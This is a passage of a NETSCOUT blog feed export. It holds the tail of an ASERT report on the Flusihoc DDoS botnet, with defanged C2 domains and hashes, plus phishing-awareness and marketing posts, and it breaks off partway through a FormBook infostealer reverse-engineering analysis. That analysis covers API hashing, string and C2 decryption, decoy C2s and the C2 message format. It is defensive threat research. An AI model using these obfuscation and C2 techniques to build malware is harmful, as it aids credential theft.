	<li>pp[.]sshtdk[.]com</li>
	<li>qq[.]sshtdk[.]com</li>
</ul>

<p>The majority of C2s observed geo-locate to China&nbsp;with most of the attack commands directed towards target URLs within China.&nbsp;A cursory review of the target URLs does not reveal any obvious correlation between targets suggesting this family is likely part of a financially motivated booter service in China.</p>

<h3>Observed DDoS Activity</h3>

<p>Arbor ATLAS infrastructure collects anonymized DDoS attack data from nearly 400 globally distributed service providers running the Arbor SP/TMS Platform. Leveraging ATLAS, we are able to measure a portion of the botnet's attacks. Since July 2017, we can correlate observed Flusihoc attack commands with 909 subsequent DDoS events reported into ATLAS. The peak attack size was 45.08 Gbps seen on July 6th, 2017. &nbsp;A majority of the DDoS attacks involve TCP SYN over port 80, 1-1023 and 443. These events have an average attack size of 603.24 Mbps usually launching around 14 different attacks per day.</p>

<p><img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/10/Picture7.png" /></p>

<h2>Conclusion</h2>

<p>Flusihoc is likely a Chinese DDoS botnet which primarily focuses on targets in China. Analysis suggests this botnet is part of a regional DDoS service based on the variance of targets. This malware family has been around since at least 2015 and has been associated with over 154 C2s. Flusihoc, although not the largest DDoS botnet, would still be capable of causing problems given the fragility and brittleness of so many&nbsp;sites, servers, services, and applications. These DDoS attacks can be mitigated by Arbor solutions like &nbsp;Arbor SP/TMS.</p>

<h2>Indicators</h2>

<h4>Samples:</h4>

<ul>
	<li>41f1c2b942fb8c78d9d3b9e339480970ead06241</li>
	<li>2ff3eab0892325b936beee70d8625c4e8d50d7c0</li>
	<li>6a1863abded29f1151db7f1eebe33298adbcb793</li>
</ul>

<h4>C2s:</h4>

<ul>
	<li>Main[.]dresou[.]net</li>
	<li>wm[.]sshtdk[.]com</li>
	<li>1211[.]sshtdk[.]com</li>
	<li>121[.]sshtdk[.]com</li>
	<li>pp[.]sshtdk[.]com</li>
	<li>qq[.]sshtdk[.]com</li>
</ul>

<h4>Yara Rule:</h4>

<ul>
	<li>(GitHub URL removed)</li>
</ul>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <enclosure url="http://localhost:7996/sites/default/files/default_images/blog_thumbnail_0.png" length="58011" type="image/png"/>
    <guid isPermaLink="false">5117064d-9775-4c34-8dd8-fa02ffac4676</guid>
    <pubDate>Tue, 03 Oct 2017 13:56:51 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>ASERT Team</dc:creator>
    </item>
<item>
  <title>Natural Disasters and Cybersecurity</title>
  <link>http://localhost:7996/blog/natural-disasters-cybersecurity</link>
  <description>One would think that in something as catastrophic as a natural disaster, people would unite and help one another. With hundreds of charities and online fundraisers for aid and assistance on alert, hackers have not slowed down.</description>
  <content:encoded><![CDATA[<p>One would think that in something as catastrophic as a natural disaster – people would unite and help one another in such a time of struggle and despair. With hundreds of charities and virtual donation ‘jars’ for aid and assistance on alert – hackers have proven to be even more heartless than ever before. During the devastating chaos and turmoil of Hurricane Harvey – perpetrators found a new method of attack: donation phishing. “Scammers have been using Hurricane Harvey-themed messages to trick people into opening phishing emails and links on social media sites, which can steal login information, infect machines with malware, or con victims out of money.” <a href="http://fortune.com/2017/08/29/hurricane-harvey-scam/" target="_blank">Fortune</a> magazine reports. "Emails requesting donations from duplicitous charitable organizations commonly appear after major natural disasters." Unfortunately, amongst an already stressed public and an unpredictable environment – hackers have not slowed their velocity towards exploitation and greed. They are using the compassion and empathy of people wanting to donate money to help ones in dire need of assistance. "People all over the world quickly rushed to their social media accounts to find the best avenues to donate to victims, but these same avenues are ideal for scammers who try to convince victims to donate to their fraudulent Hurricane Harvey cause." Zack Allen, threat operations manager at ZeroFOX.</p>

<p>Luckily, there are precautions and procedures we can follow to decrease the risk of falling prey to these malicious grifters:</p>

<ol>
	<li><strong>Keep your software up to date</strong>; hackers often try to compromise devices running outdated software that has security holes.</li>
	<li><strong>Be careful what you click</strong>; don't accept or open unsolicited content from untrusted sources.</li>
	<li><strong>Be sure </strong>the organizations to which you're contributing money are legitimate.</li>
</ol>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/donate_online1200x480.jpg" length="116901" type="image/jpeg"/>
    <guid isPermaLink="false">80d5acff-5b38-4843-85d6-fcc0cba4d486</guid>
    <pubDate>Mon, 02 Oct 2017 09:44:13 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>Greta Milingyte</dc:creator>
    </item>
<item>
  <title>Understanding Mobile Habits of Millennials with Better Data</title>
  <link>http://localhost:7996/blog/understanding-mobile-habits-millennials-better-data</link>
  <description>From the first phone call placed in 1876 through the end of the 20th Century, service provider networks were built to support a limited number of services (mainly telephony and TV). Today, all bets are off. YouTube serves up 1 billion hours of video a day worldwide. By 2021, the number of devices connected to IP networks is forecast to be three times the global population...</description>
  <content:encoded><![CDATA[<p>From the first phone call placed in 1876 through the end of the 20<sup>th</sup>&nbsp;Century, service provider networks were built to support a limited number of services (mainly telephony and TV). Today, all bets are off. YouTube serves up&nbsp;<a data-saferedirecturl="https://www.google.com/url?hl=en&amp;q=https://www.wsj.com/articles/youtube-tops-1-billion-hours-of-video-a-day-on-pace-to-eclipse-tv-1488220851&amp;source=gmail&amp;ust=1506610491680000&amp;usg=AFQjCNFtvZn0zZxjEMwuatllBrmQTdbrSg" href="https://www.wsj.com/articles/youtube-tops-1-billion-hours-of-video-a-day-on-pace-to-eclipse-tv-1488220851" target="_blank">1 billion hours of video a day</a>&nbsp;worldwide. By 2021, the number of&nbsp;<a data-saferedirecturl="https://www.google.com/url?hl=en&amp;q=https://www.cisco.com/c/en/us/solutions/collateral/service-provider/visual-networking-index-vni/vni-hyperconnectivity-wp.html%23_Toc484556816&amp;source=gmail&amp;ust=1506610491680000&amp;usg=AFQjCNGI15tZTpNSDY_hfT7ks8n5ZyvPmA" href="https://www.cisco.com/c/en/us/solutions/collateral/service-provider/visual-networking-index-vni/vni-hyperconnectivity-wp.html#_Toc484556816" target="_blank">devices connected to IP networks</a>&nbsp;is forecast to be three times the global population. Consumer behavior is therefore changing rapidly, especially among the technology-savvy Millennial Generation that is now entering adulthood. They’re avid users of mobile services, using smartphones as another appendage. Their brand loyalty is largely gone. Usability is considered among their highest metrics when it comes to judging technology.</p>

<p>Millennials are more willing to try new apps and services than other demographic groups. But they’re also very cost-conscious.&nbsp;&nbsp;</p>

<p>All of these behaviors are putting new performance and bandwidth pressures on service provider networks. So as a service provider it’s vital that you do all you can to prepare for and understand how the fast-evolving, unpredictable behavior of your customers will impact your business in the near and short-term.</p>

<p>Fortunately, better, real-time data is available to help you do just that.&nbsp;</p>

<h2><strong>The Good, the Bad and the Unpredictable</strong></h2>

<p>The mobile internet is especially rife with growth, change and opportunity. A&nbsp;<a data-saferedirecturl="https://www.google.com/url?hl=en&amp;q=https://www.forbes.com/sites/robertreiss/2015/07/14/according-to-dan-hesse-the-mobile-internet-changes-everything/%237a834d5846b0&amp;source=gmail&amp;ust=1506610491680000&amp;usg=AFQjCNEaFOTnzmfNE-UQi6iTrrR-nJm4MA" href="https://www.forbes.com/sites/robertreiss/2015/07/14/according-to-dan-hesse-the-mobile-internet-changes-everything/#7a834d5846b0" target="_blank">Forbes article</a>&nbsp;quoted former Sprint CEO Dan Hesse, who claims that cell phones―growing from zero to six billion within 25 years―have been adopted faster than any technology in history. And who would argue? The majority of digital media is now being consumed on mobile devices, along with countless new apps, many delivered over-the-top. The mobile Internet is growing up fast. We’re still just a decade into the introduction of Apple’s iPhone, which helped revolutionize mobile communications and computing for everyone.</p>

<p>And now mobile is already in the process of taking another leap into the Internet of Things, where providers will be connecting billions more endpoints.</p>

<p>Like other providers, your company is no doubt busy enhancing your networks around IP architectures to provide much greater efficiency and quality of service. You may also be using Wi-Fi to further offload a portion of your cellular or cable traffic.&nbsp;&nbsp;</p>

<p>It might not be enough. Why not? Consider what happened when Pokémon Go went viral last summer.</p>

<h2><strong>Hunting for Pokémon Characters and Decent Service</strong></h2>

<p><strong><img alt="pokemon-go-1581159_1280.jpg" height="322" src="https://images4.newscred.com/Zz0wMWRlMDA0NGYxYjk3YWM0M2FjZDBhNzZhOWVhNDgxNw==" style="display: block; margin-left: auto; margin-right: auto;" width="486.61157024793397" /></strong></p>

<p>Remember <em>Pokémon Go</em>? Peak loads caused the augmented reality (AR) game service to go down repeatedly. AR and virtual reality (VR) technologies crave continuous, high-quality connectivity bandwidth surging back and forth―according to&nbsp;<a data-saferedirecturl="https://www.google.com/url?hl=en&amp;q=https://www.networkworld.com/article/3095796/lan-wan/the-pokmon-go-effect-on-the-network.html&amp;source=gmail&amp;ust=1506610491680000&amp;usg=AFQjCNEzPnNJPhH7eh3R5QEbxSJc_wTDKQ" href="https://www.networkworld.com/article/3095796/lan-wan/the-pokmon-go-effect-on-the-network.html" target="_blank">Network World</a>, some AR/VR camera rigs could require 100 Gbps of contribution bandwidth. Low latency is also a must.</p>

<p>Bottom line: Without great service, apps like Pokémon Go will be sub-standard in performance. You’ll have angry customers, partners and developers. But if you were looking at subscriber usage patterns in real time, on an application level, you would have been able to see the rise in Pokémon Go usage as it ramped up last year. You could have predicted spikes in usage and used that knowledge to inform engineering, marketing and sales efforts.</p>

<h2><strong>Looking at Usage: Traffic, Apps, GPS</strong></h2>

<p>Equipment logs aren’t enough to understand user behavior in today’s market. You need subscriber data, voice and video session analysis. Deep-dive protocol analysis. Integration with your operational support system (OSS) applications, big data and business intelligence platforms. GPS-enriched. Available in real time. From mobile, fixed line voice, business services, residential triple-play, satellite and cable networks―whatever your niche.</p>

<p>The ability to use this greatly-expanded set of data points―call it smarter data―to gain a more nuanced understanding of what your subscribers are doing, where they’re doing it and for how long is going to inform your company’s future.</p>

<p>Smarter data will empower your analysts and data scientists to provide data-driven guidance for use by network operations, planning and engineering, marketing, customer care and the executive suite. They’ll be able to do multi-layer analysis and use contextual drilldown features to look from high-level service views down to session and packet analysis.</p>

<p>It’s all about gaining better, quicker insights into user behavior, traffic patterns and app trends.&nbsp;</p>

<h2><strong>Service Assurance for the Mobile Era</strong></h2>

<p>So it’s time to look at your service assurance and performance management metrics and analytics <a href="https://www.netscout.com/product/service-provider/ngeniusone-service-assurance-platform" target="_blank">in a new and expanded way</a>. Today’s mobile internet subscriber is morphing, adopting new types of usage and consumption behaviors that bring new impacts, dangers and opportunities.&nbsp;</p>

<p>You need a more effective data mining tool to get the real-time usage details that can power today’s decisions and&nbsp;tomorrow’s ventures. Complexity is out in favor of a simple, unified approach. You’ll need inputs from network, service and application tiers and end-to-end views into data, voice and video delivery among different subscriber groups. Your solution should be able to reveal all interactions and dependencies across multi-technology and multi-generational service domains.&nbsp;</p>

<p>With all of that in your smart data toolbox, how do you benefit? Automated detection of issues. Proactive management. Rapid troubleshooting. Lower churn. Higher ARPU.</p>

<p>Avoid the <em>Pokémon Gos</em> of tomorrow. Smart data is available to you today. Isn't it time you got smart along with it?</p>

<p>&nbsp;</p>

<p><em>Written by&nbsp;Gene Knauer. Gene is a senior content marketing writer who works with technology companies in a variety of B2B marketing communications projects.</em></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/2021-01/04/images/mobile-habits-of-millennials.jpg" length="447102" type="image/jpeg"/>
    <guid isPermaLink="false">c34a1c36-37bc-4e33-9eb4-96c6aa57a4c7</guid>
    <pubDate>Fri, 29 Sep 2017 12:00:00 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Leading the Digital Transformation: Whose Role Is It?</title>
  <link>http://localhost:7996/blog/leading-digital-transformation-whose-role-it</link>
  <description>No matter the industry vertical, digital transformation (DX) is essential for businesses of all sizes to remain competitive. Digital technologies are changing the global corporate strategy, with the majority of organizations planning at least some integration built into their business. More than ever, DX is intertwined with business success, which is why having someone at a C...</description>
  <content:encoded><![CDATA[<p>No matter the industry vertical, digital transformation (DX) is essential for businesses of all sizes to remain competitive. Digital technologies are changing the global corporate strategy, with the majority of organizations planning at least some integration built into their business. More than ever, DX is intertwined with business success, which is why having someone at a C-suite-level position in charge of the transformation is vital. Without clear leadership, and “the proper framing and orchestration at the overall company level, the best initiatives will fail to get the attention and investment they need,”&nbsp;the&nbsp;<em><a href="https://hbr.org/2017/01/to-lead-a-digital-transformation-ceos-must-prioritize" target="_blank">Harvard Business Review</a></em>&nbsp;reports. In their opinion, it is the CEO who has the power to provide this type of leadership. However, others would argue vehemently against the CEO being the right person to lead a company into a new digital age powered by operational intelligence.</p>

<p>Which leaves us with the following question:</p>

<h2>Who Should Take over the DX Leadership Role?</h2>

<p>As&nbsp;<em><a href="https://www.forbes.com/sites/danielnewman/2017/01/21/who-needs-to-lead-digital-transformation-in-2017/#5cc6ef9d8e0a" target="_blank">Forbes</a></em> reports, CIOs and CTOs have collectively taken the lead in DX efforts only 19 percent of the time. It is typically the CMO that is more likely to take charge. This agrees with a <a href="http://blogs.gartner.com/jake-sorofman/yes-cmos-will-likely-spend-more-on-technology-than-cios-by-2017/" target="_blank">study</a>&nbsp;that found CMOs are spending more on technology than CIOs because “marketing technology is now among these core systems. Customer preferences and behaviors have changed and buying journeys are increasingly self-directed and digitally led. Which means that, more than ever, multichannel marketing is among the most critical customer-facing, revenue-generating functions.”</p>

<p>But, even though digitally inclined CMOs are spending the money on continuous improvement on the business model, the CIO remains the most logical choice to lead the digital revolution, for it is the CIO who will most intimately understand an organization's current and coming&nbsp;IT needs and imperatives.</p>

<h2>CIOs Possess the Solutions and Teams to Navigate the Digital Present <em>and</em> Future</h2>

<p>One of the most vital pieces of the digital transformation is the migration of applications to the cloud. As an executive who is at the frontline of this migration, a CIO must ensure that there is a responsive, nimble and comprehensive business assurance strategy that minimizes business risk while improving application performance and assuring consistent, uninterrupted user experience. By working closely with his or her IT department, the CIO can provide a smooth transition between new technologies and what different business departments need to better do their jobs in a digital world.</p>

<p>Plus, “as digital continues to disrupt and change traditional business and operational models, CIOs have a tremendous opportunity to strategically unite disjointed departmental digital efforts,” <a href="http://deloitte.wsj.com/cio/2017/01/09/cios-poised-to-lead-enterprisewide-digital-transformation/" target="_blank">says&nbsp;Khalid Kark</a>, Managing Director at Deloitte's CIO Program.</p>

<p>The IT organization has the charter to deliver business value through services empowered by hybrid cloud, multi-cloud, virtualization, and mobility. And so, the CIO counts on the ability to lead an organization into a dynamic business environment built on service reliability, availability, and responsiveness. But business services leveraging innovative technologies and accelerators are only as good as the visibility IT has of the entire infrastructure, workloads on-premises or in the hybrid cloud, and application interdependencies.&nbsp;</p>

<p>In an age of infinite devices, multiplying cloud applications and growing connectivity, the CIO can effectively leverage swaths of smart data and business intelligence, using both as part of a dynamic feedback loop that delivers experiences customers themselves will come to dictate, while also nurturing the outgrowth of&nbsp;<span>new business models and revenue streams</span>. &nbsp;More so, by turning wire data (traffic flows) into smart data, a CIO can then not only deliver on the&nbsp;operational intelligence the <em>Harvard Business Review</em>&nbsp;calls for but will come to rely on it&nbsp;as a lighthouse by which to assure service delivery in a highly complex IT environment and navigate against rising technology trends.</p>

<p>While the CIO should be the position taking the lead, every digital transformation has to be a cooperative effort. As mentioned earlier, the CMO has a higher investment in technologies, so their input on applications used and how they fit into the business model is imperative. Likewise, the CEO and CFO need to be involved in order to direct the strategies and budget for continuous improvement. But by designating the person most in tune with a company’s IT as the one to lead DX, an organization can deliver its unique business model and stay ahead of always-shifting customer demands and expectations.</p>

<p><em>~Written by&nbsp;Sue Poremba.&nbsp;Sue Poremba is a freelance writer based in State College, Pennsylvania. She primarily covers cybersecurity and emerging technology, with a particular emphasis on how emerging technology and cybersecurity overlap.</em></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/2020-01/09/images/Zz03YjdhZmYxYmFjN2QyMjA3YjNiYWM0ZTlmOTcwOTQzZg.jpg" length="301488" type="image/jpeg"/>
    <guid isPermaLink="false">9efc84a5-0e4e-4ce5-b7b3-89e8f2a39387</guid>
    <pubDate>Thu, 28 Sep 2017 16:04:34 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>The Foundations for Digital Transformation</title>
  <link>http://localhost:7996/blog/foundations-digital-transformation</link>
  <description>Digital Transformation (DX) continues to sweep across all industries, driving the shift from physical to digital assets. Underpinning DX is the transition to an information-driven economy where data is the new currency and almost all aspects of business are rooted in software. Nowhere is this more applicable than in the telecommunications space, particularly when you consider...</description>
  <content:encoded><![CDATA[<p>Digital Transformation (DX) continues to sweep across all industries, driving the shift from physical to digital assets. Underpinning DX is the transition to an information-driven economy where data is the new currency and almost all aspects of business are rooted in software. Nowhere is this more applicable than in the telecommunications space, particularly when you consider the sheer amount of network and subscriber data that carrier service providers have access to.</p>

<p>Faced with the issue of slow business growth and ongoing disruption to core services by Over-the-Top (OTT) players and new market entrants, managing mobile data explosion and network expansion, while also providing a consistent subscriber experience, has created a disconnect between the investments mobile operators have made into 4G LTE and their subsequent decline in revenues. And despite the countless benefits DX stands to hold for mobile subscribers and network operators alike, it presents a new set of challenges that must first be overcome.</p>

<p><strong>New Challenges and New Demands</strong></p>

<p>Part of the problem is that physical infrastructure is already being pushed to its limits in the attempt to meet growing subscriber capacity demands, and yet updating or expanding existing architecture to 5G is a difficult and costly process. A related challenge is the sheer amount of network data that operators now need to process, manage, and otherwise deal with to cater for this growth.</p>

<p>Fortunately, there is a path forward in the form of the broader digital ecosystem and new commercial opportunities, but this too brings greater expectations from the network and new challenges for operators in reaching the next stage of their digital transformation journeys. To meet these expectations, and create an environment where mobile operators can embrace new business models and truly innovate to deliver new services, a new approach is needed for network design. This also stands to drive DX efforts, but only if network operators approach it correctly.</p>

<p><strong>A Virtual Future</strong></p>

<p>When it comes to supporting 5G; the deployment of this technology will be enabled through network functions virtualization (NFV) and software defined networking (SDN). After all, it’s already recognized that NFV/SDN holds the key to cost effective operations, increased automation, and the enhanced flexibility and agility of existing systems by creating a “safe to fail” environment where new business models can be set up and running in minutes rather than days or weeks.</p>

<p>Virtualization is not without its own set of challenges. While costs are reduced and capacity increased, network visibility isn’t. Network virtualization means that services and core network functions will be disaggregated across compute resources running on commercial-off-the-shelf (COTS) hardware. While performance increases, this will also increase the volume of data being created, which means visibility of the network will be more critical than ever.</p>

<p>NETSCOUT has developed new virtual instrumentation, vSCOUT and vSTREAM to provide low level visibility to virtual infrastructure and so called “micro services” leveraging the rich and extensible ASI smart data set.</p>

<p>Operators have always relied on network monitoring and troubleshooting tools, such as nGeniusONE, to identify issues affecting subscribers but it is even more essential within a virtualized environment, particularly if operators are looking to introduce new services. An inability to identify problems on the network and address them before the subscriber is affected can cost them dearly.</p>

<p><strong>A Data-led Solution</strong></p>

<p>Information and data is key to addressing this challenge, yet simply having access to big data is not enough. Business analytics that rely on a dataset that has not been normalized and correlated in the context of service delivery, operations, and business performance, is not effective. The quality of business insight is therefore contingent on having smart data. Our ASI smart data delivers well structured, contextual, available in real-time, and based on end-to-end pervasive visibility across the entire business to enable great big data analytics.</p>

<p>When you consider this, it’s clear that network monitoring and service assurance are the drivers for DX success, providing real-time and historic insights needed to power those decisions – not only for assuring overall service delivery to customers, but also ensuring the validity and competitiveness of that operator’s internal business operations.</p>

<p>As the old cliché goes: to be successful, you must have the right products at the right time. NETSCOUT is delivering those products, vSCOUT, vSTREAM and nBA.&nbsp;</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/big-data-telecomm-1200x480.jpg" length="258569" type="image/jpeg"/>
    <guid isPermaLink="false">59a2c785-2286-4eb6-a3dd-401a6071bf3f</guid>
    <pubDate>Mon, 25 Sep 2017 17:31:53 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>John English</dc:creator>
    </item>
<item>
  <title>The Formidable FormBook Form Grabber</title>
  <link>http://localhost:7996/blog/asert/formidable-formbook-form-grabber</link>
  <description>More and more we’ve been seeing references to a malware family known as FormBook. Per its advertisements it is an infostealer that steals form data from various web browsers and other applications. It is also a keylogger and can take screenshots. The malware code is complicated, busy, and fairly obfuscated--there are no Windows API calls or obvious strings. This post will start...</description>
  <content:encoded><![CDATA[<p>More and more we’ve been seeing references to a malware family known as FormBook. Per its advertisements it is an infostealer that steals form data from various web browsers and other applications. It is also a keylogger and can take screenshots. The malware code is complicated, busy, and fairly obfuscated--there are no Windows API calls or obvious strings. This post will start to explore some of these obfuscations to get a better understanding of how FormBook works.</p>

<h2>Samples</h2>

<p>The main sample used for this analysis is available <a href="http://www.kernelmode.info/forum/viewtopic.php?f=16&amp;t=4796">on the KernelMode.info forum</a> or <a href="https://www.virustotal.com/en/file/c2bbec7eb5efc46c21d5950bb625c02ee96f565d2b8202733e784e6210679db9/analysis/">on VirusTotal</a>. It is version 2.9 of FormBook. Two other samples are referenced as well:</p>

<p>&nbsp;</p>

<ul>
	<li><a href="https://www.virustotal.com/en/file/d90d9e829656cb0b5dfb76faad37b35c6b5383763bd29a3d73c65311ab31dac5/analysis/">FormBook 3.0</a></li>
	<li><a href="https://www.virustotal.com/en/file/0e2678f5d0173246c464a42aced9a6f5494e9f2619257ba7e468834e8708b726/analysis/">FormBook 2.6</a></li>
</ul>

<h2>Building Blocks</h2>

<p>Let us start with three building blocks that will be used in later sections. First, most of FormBook’s data is stored encrypted in various locations--we’ll call these “encbufs”. Encbufs vary in size and are referenced with functions similar to this: <img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/09/get_encbuf.png" /> This is a shellcoding technique to determine which address a piece of code is running at. In this example, the function will return 0x3380FAC. The encbuf will start two bytes after the returned address—jumping over the pop and retn instructions. Every encbuf starts with what looks like a normal x86 function prologue—push ebp; mov ebp, esp—but this is trickery. If you continue to disassemble this code, it quickly becomes gibberish: <img" src="//https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/09/get_encbuf2.png"> The second and third building blocks are decryption functions—decrypt_func1 and decrypt_func2 respectively. Decrypt_func1 iterates through the encrypted data and depending on the byte value copies a certain amount of data from certain offsets of the encrypted data to the plaintext data. Note: the length value passed to this function is the length of the plaintext. The length of the encrypted data isn’t explicitly stated. The other decryption function, decrypt_func2, can be broken up into three rounds: subtractions, RC4, and then additions. We’ve implemented both of these functions in a Python class, which can be found <a href="https://github.com/tildedennis/malware/blob/master/formbook/formbook_decryption.py">on GitHub</a>. </img"></p>

<h2>Windows API Calls</h2>

<p>All calls to the Windows API are done at run time via function name hashing. The hashing algorithm is CRC32, though it is not the CRC32B version as implemented in Python’s binascii.crc32 function. We used the Crc32Bzip2 function from the Python module crccheck to generate the correct values. Function names are converted to lowercase before hashing. For some of the API calls, the hashes are hardcoded into the code. An example would be 0xf5d02cd8, which resolves to ExitProcess. A listing of a bunch of Windows API function names and their corresponding hashes is available <a href="https://raw.githubusercontent.com/tildedennis/malware/master/formbook/hashes.txt">on GitHub</a>. For other calls, the API hash is fetched from an encbuf using a convoluted mechanism that can be separated into two steps. First, the encbuf containing the hashes is decrypted. This requires two other encbufs, the decryption functions from above, and some SHA1 hashing:</p>

<p><img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/09/decrypt_hashes_encbuf.png" /></p>

<p>The second step is specifying an index into the decrypted encbuf and decrypting the hash:</p>

<p><img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/09/get_hash_by_index.png" /></p>

<p>A listing of indexes, hashes, and their corresponding functions is available <a href="https://github.com/tildedennis/malware/blob/master/formbook/func_index_hashes.txt">on GitHub</a>. There are six additional API calls where the hashes are stored in a separate encbuf. We’ll point this encbuf out in another section, but they map to the following network related functions:</p>

<ul>
	<li>socket (0x46a9bfc5)</li>
	<li>htons (0xe9cef9bb)</li>
	<li>WSAStartup (0xa83c6f74)</li>
	<li>send (0x6e3cd283)</li>
	<li>connect (0x8c9cf4aa)</li>
	<li>closesocket (0x4194fdf)</li>
</ul>

<p><strong>Strings</strong> Strings are obfuscated in two ways. Some of them are built a DWORD at a time on the stack:</p>

<p><img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/09/stack_strings.png" /></p>

<p>The rest are stored in an encbuf. The strings encbuf is first decrypted using decrypt_func1. The decrypted encbuf contains an array of variable length encrypted strings, which can be represented like:</p>

<pre>
struct {
    BYTE size;
    BYTE *encrypted_string[size];
}</pre>

<p>A particular string is referenced by an index number and is decrypted using decrypt_func2: <img" src="//https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/09/decrypt_string.png"> A listing of the decrypted strings and their indexes are available <a href="https://github.com/tildedennis/malware/blob/master/formbook/decrypted_strings.txt">on GitHub</a>. <strong>Command and Control (C2) URLs</strong> The C2 URLs are stored in a “config” encbuf and the mechanism to get at them are convoluted and spread out over multiple functions. The first step of the mechanism is to figure out what process the injected FormBook code is running in. Depending on the injected process, a C2 index is saved and a 20-byte key is extracted from an encbuf and decrypted. Here is the snippet of code for when FormBook is running in explorer.exe:</img"></p>

<p><img" src="//https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/09/decrypt_string.png"> <img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/09/figure_out_which_proc.png" /> </img"></p>

<p><img" src="//https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/09/decrypt_string.png">Next, the config encbuf goes through a series of decryption steps:</img"></p>

<p><img" src="//https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/09/decrypt_string.png"> <img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/09/decrypt_c2_1.png" /> </img"></p>

<p><img" src="//https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/09/decrypt_string.png">Note: in the “Windows API Calls” section above we mentioned that six of the hashes were stored in a separate encbuf. In the screenshot above, we’ve made a comment where this encbuf comes from. The “decrypt_s205” function contains more decryption:</img"></p>

<p><img" src="//https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/09/decrypt_string.png"> <img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/09/decrypt_c2_2.png" /> </img"></p>

<p><img" src="//https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/09/decrypt_string.png">At this point, the config encbuf is decrypted, but the C2s are still obfuscated. Note that up to six C2s can be referenced depending on which process FormBook is running in. The final step is one more round of decryption using the process specific key from the first step:</img"></p>

<p><img" src="//https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/09/decrypt_string.png"> <img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/09/decrypt_c2_3.png" /> Iterating through the possible C2 offsets and keys for the analyzed sample we get: <img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/09/c2s_1.png" /> </img"></p>

<p><img" src="//https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/09/decrypt_string.png">Initially we thought there would be up to six different C2s encrypted with different keys, but it’s just the same C2. This was the case for all the other samples we spot-checked as well. <strong>Decoy C2 URLs?</strong> While reviewing a sandbox run of a FormBook 3.0 sample, we noticed phone home traffic to multiple C2s:</img"><img" src="//https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/09/decrypt_string.png"> <img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/09/decoy_c2s-1024x92.png" /> But when we extracted the C2s from its config encbuf we got a completely different C2:</img"></p>

<p><img" src="//https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/09/decrypt_string.png"> <img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/09/c2s_2.png" /></img"></p>

<p><img" src="//https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/09/decrypt_string.png"> Digging further into this, we noticed that starting in this version there were additional encrypted strings. These can be seen in this listing <a href="https://github.com/tildedennis/malware/blob/master/formbook/version_3_0_decrypted_strings.txt">on GitHub</a>. In particular starting at index 78 there are 64 seemly random domains (including the ones seen in our sandbox run). Tracing these strings in the code we see that 15 of these are randomly selected into an array and then one of them is randomly replaced with the C2 from the config encbuf. At a quick glance there doesn’t seem to be any overlap of these domains from sample to sample. They all seem to be registered, but by different entities. Some of them show up in search engines with benign looking data, but most return HTTP “page not found”s. For now, our theory is that these are randomly chosen decoy C2s. <strong>C2 Communications</strong> FormBook uses HTTP—both GETs and POSTs—for C2. An example of the initial phone home looks like this:</img"></p>

<p><img" src="//https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/09/decrypt_string.png"> <img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/09/phonehome1.png" /> </img"></p>

<p><img" src="//https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/09/decrypt_string.png">The query parameter “id” contains data encrypted with the following process: <img" src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/09/encrypting_comms.png"> Unlike other parts of FormBook, the generation of the “comms_key” is easy—it boils down to the SHA1 digest of the C2. Using a Python snippet, the communications key for the analyzed sample can be generated like this: <img" src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/09/generate_comms_key.png"> The “transform_b64_chars” function does the following character transformation:</img"></img"></img"></p>

<ul>
	<li>+ -&gt; -</li>
	<li>/ -&gt; _</li>
	<li>= -&gt; .</li>
</ul>

<p>The encrypted data from above looks like this once decrypted:</p>

<pre>
FBNG:DDE857B32.9:Microsoft Windows XP x86:QWRtaW4=</pre>

<p>It is mostly “:” delimited and consists of the following fields:</p>

<ul>
	<li>Message type (FBNG)</li>
